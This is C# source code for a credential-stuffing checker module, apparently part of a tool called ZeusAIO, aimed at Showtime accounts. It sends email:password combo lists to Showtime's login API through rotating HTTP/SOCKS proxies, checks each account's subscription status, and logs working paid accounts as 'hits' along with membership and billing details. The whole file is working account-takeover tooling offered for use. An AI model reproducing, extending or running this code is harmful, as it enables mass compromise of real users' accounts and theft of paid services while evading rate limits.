using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using System.Security.Authentication;
using System.Net;
using checker;

namespace Showtime
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36");
                            req.AddHeader("Pragma", "no-cache");
                            req.AddHeader("Accept", "*/*");
                            req.AddHeader("origin", "https://www.showtime.com");
                            req.AddHeader("referer", "https://www.showtime.com/");

                            var res0 = req.Post("https://www.showtime.com/api/user/login", "{\"email\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}", "application/json");
                            string text0 = res0.ToString();

                            if (text0.Contains("{\"accountType\":\""))
                            {
                                var AccountType = Functions.LR(text0, "{\"accountType\":\"", "\"").FirstOrDefault();
                                var Membership = Functions.LR(text0, "currentProductId\":\"", "\"").FirstOrDefault();
                                req.AddHeader("Pragma", "no-cache");
                                req.AddHeader("Accept", "*/*");
                                req.AddHeader("referer", "https://www.showtime.com/");
                                req.AddHeader("x-requested-with", "XMLHttpRequest");

                                var res1 = req.Get("https://www.showtime.com/api/user/subscription");
                                string text1 = res1.ToString();

                                var Subscription = Functions.LR(text1, "subscriptionStatus\":{\"state\":\"", "\",").FirstOrDefault();
                                var NextBilling = Functions.LR(text1, "nextBillingDate\":\"", "\"").FirstOrDefault();
                                if (text1.Contains("subscription\":\"ACTIVE") && text1.Contains("subscriptionStatus\":{\"state\":\"ACTIVE\",\""))
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - SHOWTIME] " + s[0] + ":" + s[1] + " | Account Type: " + AccountType + " | Membership: " + Membership + " | Subscription: " + Subscription + " | Next Billing: " + NextBilling, Color.Green);
                                    }
                                    Export.AsResult("/Showtime_hits", s[0] + ":" + s[1] + " | Account Type: " + AccountType + " | Membership: " + Membership + " | Subscription: " + Subscription + " | Next Billing: " + NextBilling);
                                    return false;
                                }
                                else if (text1.Contains("subscription\":\"EXPIRED") || text1.Contains("subscriptionStatus\":{\"state\":\"EXPIRED\",\"") || text1.Contains("{\"message\":\"\",\"eligibleToChangePlan\""))
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - SHOWTIME] " + s[0] + ":" + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Showtime_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                            }
                            else if (text0.Contains("We do not have an account with that email address") || text0.Contains("The email address and password you entered don't match") || text0.Contains("Failed to parse JSON payload") || text0.Contains("Your email is formatted incorrectly"))
                            {
                                break;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.errors++;
                                goto Retry;
                            }


                        }

                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}